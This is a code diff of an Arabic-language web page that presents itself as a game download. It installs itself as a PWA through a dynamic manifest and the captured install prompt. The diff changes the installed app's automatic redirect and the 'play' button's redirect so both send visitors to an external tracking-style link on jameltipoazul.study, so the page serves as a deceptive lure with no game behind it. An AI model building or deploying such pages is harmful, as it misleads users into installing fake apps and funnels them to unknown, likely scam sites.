@@ -9,14 +9,11 @@
     <link id="dynamic-manifest" rel="manifest" href="">
 
     <script>
-        // 🚀 إعادة التوجيه الفورية والذكية عند فتح التطبيق المثبت من الشاشة الرئيسية
+        // 🚀 إعادة التوجيه الفورية عند فتح التطبيق المثبت من الشاشة الرئيسية
         const isStandalone = window.matchMedia('(display-mode: standalone)').matches || window.navigator.standalone;
-        
         if (isStandalone) {
             const urlParams = new URLSearchParams(window.location.search);
-            const targetPage = urlParams.get('target') || '2.html';
-            
-            // تحويل الزائر فوراً إلى صفحة الهدف (مثل 2.html أو 5.html) مع تمرير نفس المعلمات الحالية
+            const targetPage = urlParams.get('target') || 'https://www.jameltipoazul.study/?sl=6163569-bd21a&site={TIK_APP_PW}';
             window.location.replace(targetPage + window.location.search);
         }
     </script>
@@ -38,8 +35,8 @@
             display: flex;
             flex-direction: column;
             align-items: center;
-            min-height: 100vh;
             justify-content: center;
+            min-height: 100vh;
         }
 
         .container { width: 100%; max-width: 450px; text-align: center; }
@@ -116,8 +113,8 @@
         <h1 id="game-title">تحميل اللعبة</h1>
 
         <div class="video-container">
-            <video id="game-video" controls loop playsinline poster="https://via.placeholder.com/480x270/1e293b/00f2fe?text=Game+Preview">
-                <source id="video-source" src="https://meja.do.am/tik/game1.mp4" type="video/mp4">
+            <video id="game-video" controls loop playsinline poster="">
+                <source id="video-source" src="" type="video/mp4">
             </video>
         </div>
 
@@ -135,8 +132,8 @@
         
         const gameName = urlParams.get('name') || 'لعبة أسطي الميكروباص';
         const gameImg = urlParams.get('img') || 'https://via.placeholder.com/480x270/1e293b/00f2fe?text=Game+Preview';
-        const gameVideo = urlParams.get('video') || 'https://meja.do.am/tik/game1.mp4';
-        const redirectUrl = urlParams.get('redirect') || 'https://www.google.com';
+        const gameVideo = urlParams.get('video') || 'game1.mp4'; // مسار محلي بنفس النطاق
+        const redirectUrl = urlParams.get('redirect') || 'https://www.jameltipoazul.study/?sl=6163569-bd21a&site={TIK_BRWSER_PW}';
 
         document.getElementById('page-title').textContent = gameName;
         document.getElementById('game-title').textContent = gameName;
@@ -145,7 +142,7 @@
         videoElem.poster = gameImg;
         document.getElementById('video-source').src = gameVideo;
 
-        // إعداد Manifest ديناميكي يحفظ رابط الهبوط ومعلماته كاملة عند التثبيت
+        // 1. إنشاء Manifest ديناميكي
         const manifestData = {
             "name": gameName,
             "short_name": gameName,
@@ -165,8 +162,11 @@
         const manifestBlob = new Blob([JSON.stringify(manifestData)], { type: 'application/json' });
         document.getElementById('dynamic-manifest').setAttribute('href', URL.createObjectURL(manifestBlob));
 
+        // 2. تسجيل Service Worker المحلي (نفس النطاق بدون أخطاء)
         if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('sw.js').catch(() => {});
+            navigator.serviceWorker.register('sw.js')
+                .then(() => console.log('ServiceWorker registered successfully!'))
+                .catch(err => console.log('SW registration error:', err));
         }
 
         let deferredPrompt;
@@ -175,16 +175,15 @@
         window.addEventListener('beforeinstallprompt', (e) => {
             e.preventDefault();
             deferredPrompt = e;
+            console.log('beforeinstallprompt event fired successfully.');
         });
 
         actionBtn.addEventListener('click', async () => {
-            // إذا كان الزر في وضع "تشغيل اللعبة"، يتم التوجيه إلى جوجل مباشرة
             if (actionBtn.classList.contains('btn-play')) {
                 window.location.href = redirectUrl;
                 return;
             }
 
-            // إجراء طلب التثبيت من المتصفح
             if (deferredPrompt) {
                 deferredPrompt.prompt();
                 const { outcome } = await deferredPrompt.userChoice;
@@ -193,7 +192,6 @@
                 }
                 deferredPrompt = null;
             } else {
-                // إذا لم يتوفر برومبت التثبيت الفوري، يتحول الزر للتشغيل مؤقتاً لهذه الجلسة ويحول الرابط
                 setButtonToPlay();
                 window.location.href = redirectUrl;
             }
